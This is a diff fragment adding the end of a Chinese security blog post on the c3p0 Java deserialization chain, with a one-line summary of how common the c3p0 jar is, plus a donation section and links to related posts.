class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>实战环境中c3p0的包(<strong>com.mchange.c3p0</strong>)是除cc和cb以外最多的jar包，一部分是被<code>org.quartz-scheduler:quartz</code> 依赖所带进来的</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/07/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/" class="prev">← java反序列化之ROME链</a>
+    
+    
+      <a href="/2025/07/09/Redis-hyperloglog-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2025-32023/" class="next">Redis hyperloglog 远程代码执行漏洞(CVE-2025-32023) →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
